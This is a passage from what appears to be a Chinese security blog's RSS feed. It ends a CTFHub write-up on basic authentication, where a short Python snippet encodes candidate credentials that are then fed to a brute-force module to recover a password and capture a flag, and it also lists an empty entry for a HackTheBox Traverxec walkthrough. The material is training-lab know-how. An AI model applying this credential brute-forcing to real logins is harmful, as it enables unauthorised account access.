    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encodestr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;​	将结果放进爆破模块的 payload 中，进行爆破，解码得到密码&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzzf1hs6j316d0u0tvd.jpg&quot; alt=&quot;06&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzzi7urvj312y0u0wp6.jpg&quot; alt=&quot;07&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;输入用户名密码获取flag&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Sun, 01 Mar 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/01/CTFHUB-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/01/CTFHUB-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/</guid>
        
        <category>CTFHUB</category>
        
        <category>writeup</category>
        
        
      </item>
    
      <item>
        <title>Hackthebox Traverxec writeup/Walkthrough/攻略</title>
        <description>
</description>
        <pubDate>Fri, 03 Jan 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/01/03/HTB-Traverxec/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/01/03/HTB-Traverxec/</guid>
        
        <category>HTB</category>
        
        <category>渗透测试</category>
        
        
      </item>
    
  </channel>
</rss>
